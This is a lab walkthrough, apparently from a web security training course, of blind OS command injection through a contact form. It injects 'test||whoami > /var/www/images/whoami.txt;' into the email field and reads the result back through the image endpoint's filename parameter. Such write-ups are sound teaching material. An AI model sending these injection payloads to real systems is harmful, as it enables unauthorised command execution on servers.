# OS Command Injection — Contact Form

Submit a message through the contact form.

![Contact form](https://github.com/user-attachments/assets/3cc86c46-a18c-401e-b0fe-25f2ce064d77)

Use Burp Suite to intercept the request.

The request contains the following parameters:

```text
csrf=4vLJYSZcanbIXfPZRBprItYH9YWTQ422&name=1&email=test%40test&subject=1&message=1
```

Test the `email` parameter for OS command injection by modifying its value:

```text
email=test%40test
→
email=test||whoami > /var/www/images/whoami.txt;
```

The full modified request body becomes:

```text
csrf=4vLJYSZcanbIXfPZRBprItYH9YWTQ422&name=1&email=test||whoami > /var/www/images/whoami.txt;&subject=1&message=1
```

The `/var/www/images` path is provided in the lab.

The payload attempts to execute:

```bash
whoami
```

and redirects the command output into:

```text
/var/www/images/whoami.txt
```

The `>` operator redirects the standard output of the command into the specified file.

## Retrieve the Command Output

![Intercept image request](https://github.com/user-attachments/assets/14a86687-f2e6-4820-951e-34b81f9ec416)

Intercept a request used to retrieve an image:

```http
GET /image?filename=2.jpg HTTP/2
```

Modify the `filename` parameter to request the file created by the injected command:

```http
GET /image?filename=2.jpg HTTP/2
→
GET /image?filename=whoami.txt HTTP/2
```

![Command output](https://github.com/user-attachments/assets/12ae535f-4c68-4221-8303-3b9e9f696431)

The application successfully returns the contents of `whoami.txt`.

This confirms an **OS command injection vulnerability** in the `email` parameter. The application appears to pass user-controlled input into an OS command without sufficient sanitisation or safe command execution.

Because the command output is not returned directly in the original response, the output is redirected to a file inside the web-accessible `/var/www/images` directory and then retrieved through the `/image` endpoint.
